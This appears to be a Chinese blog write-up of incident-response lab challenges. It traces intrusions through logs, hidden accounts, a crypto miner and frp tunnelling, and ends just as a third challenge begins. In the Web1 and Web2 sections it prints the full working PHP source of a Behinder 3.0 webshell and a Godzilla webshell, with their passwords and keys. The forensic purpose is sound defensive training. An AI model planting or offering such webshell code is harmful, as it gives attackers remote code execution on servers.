@@ -1,0 +1,438 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>知攻善防WP | 0xYyssh'Blog</title><meta name="author" content="0xYyssh"><meta name="copyright" content="0xYyssh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="个人对知攻善防出的应急响应靶场做的一些WP,不喜勿喷">
+<meta property="og:type" content="article">
+<meta property="og:title" content="知攻善防WP">
+<meta property="og:url" content="http://example.com/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/index.html">
+<meta property="og:site_name" content="0xYyssh&#39;Blog">
+<meta property="og:description" content="个人对知攻善防出的应急响应靶场做的一些WP,不喜勿喷">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/sword.jpg">
+<meta property="article:published_time" content="2025-05-19T03:11:27.000Z">
+<meta property="article:modified_time" content="2025-05-19T05:38:47.685Z">
+<meta property="article:author" content="0xYyssh">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/sword.jpg"><link rel="shortcut icon" href="/images/firewall.png"><link rel="canonical" href="http://example.com/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '知攻善防WP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/static/css/atom-one-dark.css"><meta name="baidu-site-verification" content="codeva-WUyHHrqn47" /><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/images/top.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/sword.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-user"></i><span> 狐朋狗友</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/top.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">0xYyssh'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">知攻善防WP</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-user"></i><span> 狐朋狗友</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">知攻善防WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-19T03:11:27.000Z" title="发表于 2025-05-19 11:11:27">2025-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-19T05:38:47.685Z" title="更新于 2025-05-19 13:38:47">2025-05-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web渗透1"><a href="#web渗透1" class="headerlink" title="web渗透1"></a>web渗透1</h2><p>前景需要：<br>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：</p>
+<p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p>
+<p>用户：<br>administrator<br>密码<br><a href="mailto:&#x5a;&#x67;&#x73;&#x66;&#x40;&#97;&#x64;&#x6d;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;">&#x5a;&#x67;&#x73;&#x66;&#x40;&#97;&#x64;&#x6d;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;</a></p>
+<h3 id="第一个要找到shell密码，那我们首先就要找到shell，两种办法"><a href="#第一个要找到shell密码，那我们首先就要找到shell，两种办法" class="headerlink" title="第一个要找到shell密码，那我们首先就要找到shell，两种办法"></a>第一个要找到shell密码，那我们首先就要找到shell，两种办法</h3><ol>
+<li>第一个直接用工具扫网站根目录（小皮面板打开）</li>
+<li>第二个手动分析日志文件</li>
+</ol>
+<ul>
+<li>工具:D盾、河马</li>
+</ul>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_1_hemaWebShell.png" alt="image-20250425224403142"></p>
+<ul>
+<li>phpstud的yapache2的日志文件在C:\phpstudy_pro\Extensions\Apache2.4.39\logs<ul>
+<li>手动分析access.log.1708905600，发现明显木马痕迹</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_log.png" alt="image-20250425221903429"></p>
+<p>可以看到木马在网站根目录下的&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;</p>
+<p>打开木马文件进行分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用过冰蝎的应该一眼能看出，这是冰蝎3.0的aes128+base64的shell，而且是原密码没有改，也就是rebeyond，这样第一题就完成了</p>
+<h3 id="第二个要找到攻击者的ip地址，还是日志分析，发送shell-php的ip是192-168-126-1"><a href="#第二个要找到攻击者的ip地址，还是日志分析，发送shell-php的ip是192-168-126-1" class="headerlink" title="第二个要找到攻击者的ip地址，还是日志分析，发送shell.php的ip是192.168.126.1"></a>第二个要找到攻击者的ip地址，还是日志分析，发送shell.php的ip是192.168.126.1</h3><h3 id="第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令"><a href="#第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令" class="headerlink" title="第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令"></a>第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令</h3><ul>
+<li><code>wmic useraccount get * /format:list</code>:可以列出用户</li>
+<li>在C:\Users下可以看到用户所创的个人文件夹，文件夹名就是用户名</li>
+<li>在设置账户下也可以看到其他用户</li>
+</ul>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_3_useraccount.png" alt="image-20250425223836611"></p>
+<p>拿到隐藏用户名hack168$</p>
+<h3 id="第四个是拿到攻击者挖矿的矿池域名"><a href="#第四个是拿到攻击者挖矿的矿池域名" class="headerlink" title="第四个是拿到攻击者挖矿的矿池域名"></a>第四个是拿到攻击者挖矿的矿池域名</h3><ol>
+<li><p>第一种，由于hack用户还没删除，可以修改hack用户密码直接登录，可以查看进行操作</p>
+<ul>
+<li>使用命令修改hack用户密码：<code>net user hack168$ 123456qwe@123</code></li>
+<li>登录hack用户界面，发现可疑程序,点击运行，发现系统卡死，判断为挖矿程序</li>
+<li>从该程序的图标可以推测该程序是使用<a target="_blank" rel="noopener" href="https://muzing.gitbook.io/pyinstaller-docs-zh-cn">PyInstaller</a>工具打包的的，因此可以使用pyinstxtractor脚本提取.pyc文件：<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></li>
+</ul>
+<p> <img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_4_problem.png" alt="image-20250425224616304"></p>
+<p> 提取出PyInstaller打包的pyc文件后，可以使用<a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6">uncompyle6</a>工具反编译Kuang.pyc文件，或者使用在线反编译网站：<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a> ：</p>
+<p> <img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_4_uncompile.png" alt="image-20250425225149393"></p>
+<p> <img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_4_codeSource.png" alt="image-20250425225345727"></p>
+<p> 成功拿到源码，其中requests.get之中就是矿池域名：wakuang.zhigonshangfang.top</p>
+</li>
+<li><p>直接在administrator下使用everything搜索exe可执行文件，查找木马</p>
+</li>
+</ol>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_4_everythingSearchKuang.png" alt="image-20250425230122620"></p>
+<p>其实这里我们也可以看到这个程序是位于hack用户的desktop（桌面）上的</p>
+<p>最后提交flag：</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_5_submitflag.png" alt="image-20250425230537368"></p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。</p>
+<p>这是他的服务器系统，请你找出以下内容，并作为通关条件：</p>
+<p>1.攻击者的IP地址（两个）？</p>
+<p>2.攻击者的webshell文件名？</p>
+<p>3.攻击者的webshell密码？</p>
+<p>4.攻击者的伪QQ号？</p>
+<p>5.攻击者的伪服务器IP地址？</p>
+<p>6.攻击者的服务器端口？</p>
+<p>7.攻击者是如何入侵的（选择题）？</p>
+<p>8.攻击者的隐藏用户名？</p>
+<p>相关账户密码</p>
+<p>用户:administrator</p>
+<p>密码:<a href="mailto:&#x5a;&#x67;&#115;&#x66;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#x5a;&#x67;&#115;&#x66;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a></p>
+<h3 id="1-要找攻击者ip，依旧是分析日志"><a href="#1-要找攻击者ip，依旧是分析日志" class="headerlink" title="1.要找攻击者ip，依旧是分析日志"></a>1.要找攻击者ip，依旧是分析日志</h3><p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web2_1_log.png" alt="image-20250426211815239"></p>
+<p>很明显的扫描网站目录，高并发多请求，锁定一个ip192.168.135</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web2_1_logshell.png" alt="image-20250426212012005"></p>
+<h4 id="找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system-php"><a href="#找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system-php" class="headerlink" title="找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php"></a>找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;hack6618&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;7813d1590d28a7dd&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="确认位木马文件，密码是hack6618，这个是哥斯拉的木马-可以看到脚本逻辑是一样的"><a href="#确认位木马文件，密码是hack6618，这个是哥斯拉的木马-可以看到脚本逻辑是一样的" class="headerlink" title="确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的"></a>确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的</h4><p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_Godzillashell.png" alt="image-20250426213142240"></p>
+<p>问题里面有攻击者隐藏用户名，可以根据用户名判断他的行为，从而得到伪qq</p>
+<h4 id="隐藏用户名依旧是命令一把梭：wmic-useraccount-get-format-list"><a href="#隐藏用户名依旧是命令一把梭：wmic-useraccount-get-format-list" class="headerlink" title="隐藏用户名依旧是命令一把梭：wmic useraccount get * /format:list"></a>隐藏用户名依旧是命令一把梭：<code>wmic useraccount get * /format:list</code></h4><p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_hackuser.png" alt="image-20250426213558622"></p>
+<p>判断进行远程登录，可以事件查看器：<code>eventvwr</code>，筛选登录成功事件ID:4624</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_1_eventvwrIP.png" alt="image-20250426220405157"></p>
+<p>拿到IP:192.168.126.129</p>
+<p>或者使用日志分析工具：推荐使用WindowsLog_Check或者windows日志一键分析小工具，快速分析登录日志，得到攻击者的IP地址：</p>
+<ul>
+<li>WindowsLog_Check: <a target="_blank" rel="noopener" href="https://github.com/Fheidt12/Windows_Log">https://github.com/Fheidt12/Windows_Log</a></li>
+</ul>
+<h3 id="2-webshell名-找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system-php"><a href="#2-webshell名-找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system-php" class="headerlink" title="[2.webshell名](# 找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php)"></a>[2.webshell名](# 找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php)</h3><h3 id="3-webshell密码-确认位木马文件，密码是hack6618，这个是哥斯拉的木马-可以看到脚本逻辑是一样的"><a href="#3-webshell密码-确认位木马文件，密码是hack6618，这个是哥斯拉的木马-可以看到脚本逻辑是一样的" class="headerlink" title="[3.webshell密码](# 确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的)"></a>[3.webshell密码](# 确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的)</h3><h3 id="4-查找伪QQ号"><a href="#4-查找伪QQ号" class="headerlink" title="4.查找伪QQ号"></a>4.查找伪QQ号</h3><p>登录QQ号，会在C:\Users\Administrator\Documents\Tencent Files产生一个文件夹，这个文件夹是QQ号的</p>
+<p>拿到QQ号：777888999321</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_4_qq.png" alt="image-20250426221707364"></p>
+<p>还看到有个frp的内网穿透，打开frp的配置文件</p>
+<h3 id="5-6-伪服务器ip的端口"><a href="#5-6-伪服务器ip的端口" class="headerlink" title="5&#x2F;6.伪服务器ip的端口"></a>5&#x2F;6.伪服务器ip的端口</h3><p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_5and6_serverPort.png" alt="image-20250426222003753"></p>
+<p>拿到服务器ip：256.256.66.88</p>
+<p>端口：65536</p>
+<h3 id="7-分析黑客如何入侵"><a href="#7-分析黑客如何入侵" class="headerlink" title="7.分析黑客如何入侵"></a>7.分析黑客如何入侵</h3><p>打开网站插件目录，发现有FTP,分析FTP的日志，发现前面爆破账号密码，最后弱密码登录成功，传入哥斯拉木马system.php</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_7_ftpLog.png" alt="image-20250426222616449"></p>
+<h3 id="8-查找隐藏用户名-隐藏用户名依旧是命令一把梭：wmic-useraccount-get-format-list"><a href="#8-查找隐藏用户名-隐藏用户名依旧是命令一把梭：wmic-useraccount-get-format-list" class="headerlink" title="[8.查找隐藏用户名](# 隐藏用户名依旧是命令一把梭：wmic useraccount get * /format:list)"></a>[8.查找隐藏用户名](# 隐藏用户名依旧是命令一把梭：<code>wmic useraccount get * /format:list</code>)</h3><p>全部题解：<img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_8_allwp.png" alt="image-20250426223042347"></p>
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>挑战内容</p>
+<p>前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。</p>
+<p>这是他的服务器，请你找出以下内容作为通关条件：</p>
